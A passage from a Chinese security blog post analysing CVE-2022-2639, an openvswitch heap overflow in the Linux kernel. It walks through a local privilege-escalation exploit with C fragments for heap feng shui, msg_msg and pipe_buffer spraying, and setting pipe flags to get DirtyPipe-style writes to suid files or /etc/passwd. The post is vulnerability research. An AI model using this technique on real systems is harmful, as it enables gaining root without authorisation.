class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3740 */</span> 		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">------</span><br><span class="line">    					<span class="comment">// call here</span></span><br><span class="line"><span class="comment">/* 3751 */</span> 				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 3752 */</span> 						    optname == PACKET_TX_RING);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/packet/af_packet.c:4306</span></span><br><span class="line"><span class="comment">/* 4306 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params"><span class="comment">/* 4307 */</span> 		<span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line"><span class="comment">/* 4308 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4331 */</span> 	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4376 */</span> 		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">				<span class="comment">// call here</span></span><br><span class="line"><span class="comment">/* 4377 */</span> 		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/packet/af_packet.c:4281</span></span><br><span class="line"><span class="comment">/* 4281 */</span> <span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line"><span class="comment">/* 4282 */</span> &#123;</span><br><span class="line"><span class="comment">/* 4283 */</span> 	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4287 */</span> 	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4291 */</span> 	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">    			<span class="comment">// alloc buffer !!!</span></span><br><span class="line"><span class="comment">/* 4292 */</span> 		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br></pre></td></tr></table></figure>

<p>使用例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;setsockopt(PACKET_VERSION): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;setsockopt(PACKET_RX_RING): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;socket(AF_PACKET): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">                               sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;bind(AF_PACKET): %m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>) <span class="comment">// 分配一个0x10000的chunk</span></span><br><span class="line">close(fd) <span class="comment">// 释放 chunk</span></span><br><span class="line">    </span><br><span class="line">fd = pagealloc_pad(<span class="number">100</span>, <span class="number">0x1000</span>) <span class="comment">// 分配 100 个 0x1000 的chunk</span></span><br><span class="line">close(fd) <span class="comment">// 一次性释放这个100个chunk</span></span><br></pre></td></tr></table></figure>



<p>那么首先，我们用这个技巧把内核的堆整理一下，尽可能把freelist中的堆块都用完。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">logd(<span class="string">&quot;do heap fengshui to reduce noise ...&quot;</span>);</span><br><span class="line">pagealloc_pad(<span class="number">1000</span>, <span class="number">0x1000</span>);</span><br><span class="line">pagealloc_pad(<span class="number">500</span>, <span class="number">0x2000</span>);</span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x4000</span>);</span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x8000</span>);</span><br><span class="line">pagealloc_pad(<span class="number">100</span>, <span class="number">0x10000</span>);</span><br></pre></td></tr></table></figure>



<p>接着，我们申请一些0x10000的堆块，由于刚整理过堆，因此内核中并不存在0x10000的空闲堆块，便会从order 5(0x20000)申请内存并分割成两个order 4(0x10000)。因此这里分配的0x10000的堆块地址极大概率是相连的。</p>
<p>之后我们每隔一个释放一个，由于从order 5分割出来的两个堆块并不同时处于freelist中，因此并没有被合并到order 5，而是停留在freelist中，从而大概率得到如下的堆布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fengshui_skfd_cnt (0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fengshui_skfd[fengshui_skfd_cnt];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fengshui_skfd_cnt; i++) &#123;</span><br><span class="line">	fengshui_skfd[i] = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; fengshui_skfd_cnt; i += <span class="number">2</span>) &#123;</span><br><span class="line">	close(fengshui_skfd[i]);</span><br><span class="line">	fengshui_skfd[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512231843872.png" alt="image-20220512231843872"></p>
<p>接着我们堆喷<code>struct msg_msg</code>，包含一个0x1000的<code>struct msg_msg</code>和一个0x400的<code>struct msg_msgseg</code>。那么由于之前把堆清理干净了，这个放在freelist里的0x10000堆块就会被层层分割，提供给这两个结构体用。那大概率，这个0x10000堆块后面就会紧跟着一个<code>struct msg_msg</code>。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512232254083.png" alt="image-20220512232254083"></p>
<p>接着，我们把刚才留着的另一半<code>rx_ring buffer</code>也释放掉，依然因为两个order 4堆块不同时存在于freelist中，所以没有向上合并到order5而是停留在freelist中。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512232743116.png" alt="image-20220512232743116"></p>
<p>再调用前面的POC，<code>struct nlattr</code>自然落在了n个如上结构中的free堆块处，从而触发堆溢出修改相连msg的<code>m_ts</code>字段。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512233523494.png" alt="image-20220512233523494"></p>
<p>这样，我们就可以通过在msgrcv时使用<code>MSG_COPY</code> flag 来泄露<code>struct msg_msgseg</code>后面的数据。</p>
<p>大多数情况我们遇到这个msgseg后面正好跟着是另一个msg队列中的msgseg，从而根据预先写在msg buffer中的记号识别处对应的msg队列并释放它。随后另起一堆msg队列，且每个队列中塞16个0x400的msg，去占用释放的这个堆块。</p>
<p>队列如下：</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220315143558030.png" alt="image-20220315143558030"></p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512234254555.png" alt="image-20220512234254555"></p>
<p>借助上面被修改了ts的msg，我们再次越界读，这次读取到了B的next指针，从而知道了C的地址。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512235032056.png" alt="image-20220512235032056"></p>
<p>记住这个C，后面要用来UAF！！</p>
<p>我们故技重施，再次得到如下的结构，并调用POC代码触发堆溢出写，但这次我们修改的字段不是m_ts，而是<code>m_list.next</code>。刚才我们得到msg C的地址，我们将修改的<code>m_list.next</code>指针也指向它。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512232743116.png" alt="image-20220512232743116"></p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512235627866.png" alt="image-20220512235627866"></p>
<p>此时，我们通过C所在的msg队列将C释放，B和C处于同一队列，因此B中的next指针会由于正常的unlink被改掉，但由于A的<code>m_list.next</code>是我们修改的，不会由于unlink修改，从而得到了一个0x400 chunk的UAF。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512235925974.png" alt="image-20220512235925974"></p>
<p>接着再堆喷<code>sk_buff-&gt;data</code>，希望有一个<code>sk_buff-&gt;data</code>能够占用msg C的chunk。</p>
<blockquote>
<p>稍微提一下，这个<code>sk_buff-&gt;data</code>是用于socket中的UDP的，大小为0x180~0x1000，前面是用户可控数据，后面0x140是<code>struct skb_shared_info</code>，且分配的flag为<code>GFP_KERNEL_ACCOUNT</code>。</p>
</blockquote>
<p>由于<code>sk_buff-&gt;data</code>结构体的特性，我们可以伪造一个合法的msg头部出来：</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513000504671.png" alt="image-20220513000504671"></p>
<p>这下，我们在通过msg A所在队列将<code>sk_buff-&gt;data</code>所在chunk 释放，得到一个<code>sk_buff-&gt;data</code>的UAF。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513000640216.png" alt="image-20220513000640216"></p>
<p>接着再堆喷<code>struct pipe_buffer</code>，指望能有一个pipe buffer和skbuff data共用一个chunk。且同时操作pipe，打开目标suid文件，并做好splice操作：</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513001425838.png" alt="image-20220513001425838"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ATTACK_FILE <span class="string">&quot;/usr/bin/mount&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// filled with pipe_buffer</span></span><br><span class="line">logd(<span class="string">&quot;spray pipe_buffer to re-acquire the 0x400 slab freed by skbuff_data&quot;</span>);</span><br><span class="line"><span class="type">int</span> attack_fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (attack_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    die(<span class="string">&quot;open %s: %m&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipes[i])) &#123;</span><br><span class="line">        die(<span class="string">&quot;alloc pipe failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], buff, <span class="number">0x100</span> + i);</span><br><span class="line"></span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(attack_fd, &amp;offset, pipes[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;splice() failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能 free skbuff data，泄露整个pipe buffer结构体，并转化为pipe buffer的UAF。</p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513001728302.png" alt="image-20220513001728302"></p>
<p>下一步很关键！因为我们并不需要泄露ops字段，而是直接奔着flags去。</p>
<p>因为我们并不做ROP，而是将其转化为类似DirtyPipe的场景，我们知道自从DirtyPipe被修复后，使用<code>splice()</code>时flags会被重新设置为0，而我们的目标就是将这个flags再次修改为<code>PIPE_BUF_FLAG_CAN_MERGE</code>，从而将DirtyPipe作为和ROP同级别的原语来使用，只不过后者是内核任意代码执行，而前者是任意文件修改，它们都能让我们得到本地权限提升。</p>
<blockquote>
<p>具体可以参考 <a target="_blank" rel="noopener" href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></p>
<p>在 kernel &gt;&#x3D; 5.8 中需要修改 pipe buffer 中 splice 页的<code>flag |= PIPE_BUF_FLAG_CAN_MERGE</code>即可（有能力可以顺便把offset和len改成0，这样就能从文件的开头开始写）；在 kernel &lt; 5.8 中，需要先leak一下pipe_buffer中的anon_pipe_ops，然后将 splice 页的的ops改为anon_pipe_ops（因为&lt;5.8版本中能否merge是看ops的）（有能力依然可以顺便把offset和len改成0）。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">logd(<span class="string">&quot;edit pipe_buffer-&gt;flags&quot;</span>);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line">    <span class="built_in">memcpy</span>(buff, pipe_buffer_backup, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">    ptr[<span class="number">1</span>].flags = PIPE_BUF_FLAG_CAN_MERGE; <span class="comment">// for kernel &gt;= 5.8</span></span><br><span class="line">    ptr[<span class="number">1</span>].len = <span class="number">0</span>;</span><br><span class="line">    ptr[<span class="number">1</span>].offset = <span class="number">0</span>;</span><br><span class="line">    ptr[<span class="number">1</span>].ops = ptr[<span class="number">0</span>].ops; <span class="comment">// for kernel &lt; 5.8</span></span><br><span class="line">    spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br><span class="line">    hexdump(buff, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> typ_pipe_buffer) * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513002512092.png" alt="image-20220513002512092"></p>
<p>从而下次对pipe写入就会修改文件的page cache，得到和DirtyPipe一样任意文件写的能力！对本地提权来说只要修改suid程序的内容或是修改&#x2F;etc&#x2F;passwd即可。</p>
<p>通过pipe原语，我们就可以无需ROP从而得到一份几乎不用做版本适配的通用内核exploit代码，非常的完美。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</a></li>
<li><a target="_blank" rel="noopener" href="https://etenal.me/archives/1825">https://etenal.me/archives/1825</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-a-BUG"><span class="toc-number">2.1.</span> <span class="toc-text">Just a BUG ??</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-a-vulnerability"><span class="toc-number">2.2.</span> <span class="toc-text">It’s a vulnerability !!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2022-2639  openvswitch LPE  漏洞分析&body=Check out this article: https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=CVE-2022-2639  openvswitch LPE  漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    veritas501
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
